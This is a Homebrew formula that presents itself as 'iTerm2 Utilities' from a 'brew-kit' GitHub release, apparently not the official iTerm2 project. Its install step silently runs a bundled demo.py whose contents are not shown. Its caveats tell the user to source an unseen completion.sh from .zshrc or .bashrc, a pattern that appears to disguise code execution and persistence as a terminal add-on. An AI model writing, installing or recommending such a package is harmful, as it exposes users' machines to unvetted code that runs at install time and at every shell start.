class Iterm2Utils < Formula
  desc "iTerm2 Utilities"
  homepage "https://github.com/brew-kit/"
  url "https://github.com/brew-kit/iterm2-utils/releases/download/v1.3/iterm2-utils-1.3.tar.gz"
  sha256 "82b834c50e2943f460a1c8aa23c84257a122eb638d6d54c49924a8a34d9111c4"
  version "1.3"
  depends_on "python@3.12"

  def install
    libexec.install Dir["*"]
    system "/opt/homebrew/opt/python@3.12/bin/python3.12 -m venv --system-site-packages --without-pip #{libexec}"
    system "#{libexec}/bin/python -m ensurepip"
    system "#{libexec}/bin/python -m pip install pyobjc"
    system "#{libexec}/bin/python #{libexec}/demo.py"
  end

  def caveats
    <<~EOS
    To finish installation, add the following line to .zshrc or .bashrc  
  source #{libexec}/completion.sh
Then reopen your terminal app. Thank you for using iTerm2
    EOS
  end
end
